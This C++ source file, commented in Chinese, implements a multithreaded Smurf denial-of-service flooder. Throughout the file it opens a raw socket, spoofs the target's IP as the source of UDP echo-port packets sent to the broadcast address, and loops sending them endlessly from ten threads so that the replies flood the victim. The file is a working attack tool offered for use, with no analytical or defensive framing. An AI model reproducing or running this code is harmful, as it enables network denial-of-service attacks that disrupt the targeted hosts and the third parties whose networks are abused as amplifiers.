#include "smurf.h"
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define THREADS_COUNT 10    // 线程数
#define PKT_SIZE 65536      // 包大小


// Smurf 攻击数据包
struct smurf_packet {
    struct iphdr ip;
    struct udphdr udp;
};

// 生成 Smurf 攻击数据包
void *generate_smurf(void *arg) {


    char* tar_ip=(char*)arg;

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        std::cerr << "Failed to create socket" << std::endl;
        return NULL;
    }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(7);
//    inet_pton(AF_INET, "10.0.0.1", &target_addr.sin_addr);
    inet_pton(AF_INET, tar_ip, &target_addr.sin_addr);


    char packet_buffer[PKT_SIZE];
    memset(packet_buffer, 0, sizeof(packet_buffer));

    struct smurf_packet *pkt = (struct smurf_packet *)packet_buffer;
    pkt->ip.ihl = 5;
    pkt->ip.version = 4;
    pkt->ip.tos = 0;
    pkt->ip.tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    pkt->ip.id = htons(54321);
    pkt->ip.frag_off = htons(IP_DF);
    pkt->ip.ttl = 255;
    pkt->ip.protocol = IPPROTO_UDP;
    pkt->ip.saddr = target_addr.sin_addr.s_addr;
    pkt->ip.daddr = (in_addr_t)0xffffffff;

    pkt->udp.source = htons(7);
    pkt->udp.dest = htons(7);
    pkt->udp.len = htons(sizeof(struct udphdr));
    pkt->udp.check = 0;

    while (1) {
        if (sendto(sockfd, packet_buffer, pkt->ip.tot_len, 0,
            (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            std::cerr << "Failed to send packet" << std::endl;
        }
    }

    return NULL;
}

smurf::smurf(char* dst_ip)
{
    char* arg=dst_ip;
    pthread_t threads[THREADS_COUNT];
    for (int i = 0; i < THREADS_COUNT; i++) {
        pthread_create(&threads[i], NULL, generate_smurf, arg);
    }

    for (int i = 0; i < THREADS_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
}
